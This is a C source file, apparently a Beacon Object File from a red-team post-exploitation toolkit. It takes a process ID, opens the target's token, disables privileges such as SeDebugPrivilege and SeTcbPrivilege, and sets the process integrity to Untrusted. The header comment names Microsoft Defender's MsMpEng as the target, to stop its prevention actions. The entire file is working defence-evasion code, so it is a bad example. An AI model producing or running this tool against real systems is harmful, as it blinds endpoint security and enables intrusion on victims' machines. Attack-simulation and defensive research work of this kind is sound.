/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( AdjustTokenPrivileges );
	D_API( LookupPrivilegeValueA );
	D_API( SetTokenInformation );
	D_API( NtOpenProcessToken );
	D_API( NtOpenProcess ); 
	D_API( GetLengthSid );
	D_API( NtClose );
} API, *PAPI ;

VOID TogglePrv( _In_ PAPI Api, _In_ HANDLE Token, _In_ PCHAR Privilege, _In_ BOOLEAN Enable )
{
	LUID			Uid;
	TOKEN_PRIVILEGES 	Prv;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Uid, sizeof( Uid ) );
	RtlSecureZeroMemory( &Prv, sizeof( Prv ) );

	/* If the privilege exists, look it up */
	if ( Api->LookupPrivilegeValueA( NULL, Privilege, &Uid ) ) {
		Prv.PrivilegeCount = 1;
		Prv.Privileges[ 0 ].Luid = Uid;
		Prv.Privileges[ 0 ].Attributes = Enable ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

		/* Toggle the privilege */
		if ( ! Api->AdjustTokenPrivileges( Token, FALSE, &Prv, sizeof( TOKEN_PRIVILEGES ), NULL, NULL ) ) {
			BeaconPrintf( CALLBACK_ERROR, "Could not toggle off privilege %s", Privilege );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Uid, sizeof( Uid ) );
	RtlSecureZeroMemory( &Prv, sizeof( Prv ) );
};

/*!
 *
 * Purpose:
 *
 * Switches a process's token's privileged to an
 * 'DISABLED' state. Can be used against MsMpEng
 * to prevent defenders 'prevention' actions from
 * running.
 *
!*/
VOID NoPrivsGo( _In_ PCHAR Argv, _In_ INT Argc )
{
	API			Api;
	SID			Sid;
	datap			Psr;
	CLIENT_ID		Cid;
	OBJECT_ATTRIBUTES	Att;
	TOKEN_MANDATORY_LABEL	Tml;

	UINT32			Pid = 0;

	HANDLE			Ntl = NULL;
	HANDLE			Adv = NULL;
	HANDLE			Prc = NULL;
	HANDLE			Tok = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Sid, sizeof( Sid ) );
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Tml, sizeof( Tml ) );

	/* Extract target PID argument */
	BeaconDataParse( &Psr, Argv, Argc );
	Pid = BeaconDataInt( &Psr );

	if ( Pid != 0 ) {
		/* Rereference NTDLL */
		Ntl = LoadLibraryA( "ntdll.dll" );

		if ( Ntl != NULL ) {

			/* Build Stack API Table */
			Api.NtOpenProcessToken = C_PTR( GetProcAddress( Ntl, "NtOpenProcessToken" ) );
			Api.NtOpenProcess      = C_PTR( GetProcAddress( Ntl, "NtOpenProcess" ) );
			Api.NtClose            = C_PTR( GetProcAddress( Ntl, "NtClose" ) );

			/* Reference ADVAPI32 */
			Adv = LoadLibraryA(  "advapi32.dll" );

			if ( Adv != NULL ) {

				Api.LookupPrivilegeValueA = C_PTR( GetProcAddress( Adv, "LookupPrivilegeValueA" ) );
				Api.AdjustTokenPrivileges = C_PTR( GetProcAddress( Adv, "AdjustTokenPrivileges" ) );
				Api.SetTokenInformation   = C_PTR( GetProcAddress( Adv, "SetTokenInformation" ) );
				Api.GetLengthSid          = C_PTR( GetProcAddress( Adv, "GetLengthSid" ) );

				/* Open the target process */
				Cid.UniqueProcess = C_PTR( Pid );
				InitializeObjectAttributes( &Att, NULL, OBJ_CASE_INSENSITIVE, NULL, NULL );

				if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_QUERY_LIMITED_INFORMATION, &Att, &Cid ) ) ) {
					/* Open up the target token */
					if ( NT_SUCCESS( Api.NtOpenProcessToken( Prc, TOKEN_ALL_ACCESS, &Tok ) ) ) {

						/* Attempts to toggle off all privileges */
						TogglePrv( &Api, Tok, "SeAssignPrimaryTokenPrivilege", FALSE );
						TogglePrv( &Api, Tok, "SeTakeOwnershipPrivilege", FALSE );
						TogglePrv( &Api, Tok, "SeChangeNotifyPrivilege", FALSE );
						TogglePrv( &Api, Tok, "SeImpersonatePrivilege", FALSE );
						TogglePrv( &Api, Tok, "SeLoadDriverPrivilege", FALSE );
						TogglePrv( &Api, Tok, "SeSecurityPrivilege", FALSE );
						TogglePrv( &Api, Tok, "SeRestorePrivilege", FALSE );
						TogglePrv( &Api, Tok, "SeBackupPrivilege", FALSE );
						TogglePrv( &Api, Tok, "SeDebugPrivilege", FALSE );
						TogglePrv( &Api, Tok, "SeTcbPrivilege", FALSE ); 

						Sid.Revision = SID_REVISION;
						Sid.SubAuthorityCount = 1;
						Sid.IdentifierAuthority.Value[5] = 16;
						Sid.SubAuthority[0] = SECURITY_MANDATORY_UNTRUSTED_RID;
  
						Tml.Label.Attributes = SE_GROUP_INTEGRITY;
						Tml.Label.Sid        = C_PTR( &Sid );

						/* Trigger the lowering of the SID */
						if ( Api.SetTokenInformation( Tok, TokenIntegrityLevel, &Tml, sizeof( Tml ) + Api.GetLengthSid( & Sid ) ) ) {
							BeaconPrintf( CALLBACK_OUTPUT, "Successfully removed critical privileges and set process to untrusted.", Pid );
						};

						/* Close */
						Api.NtClose( Tok );
					};
					/* Close */
					Api.NtClose( Prc );
				};

				/* Dereference */
				FreeLibrary( Adv );
			};

			/* Dereference */
			FreeLibrary( Ntl );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Sid, sizeof( Sid ) );
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Tml, sizeof( Tml ) );
};
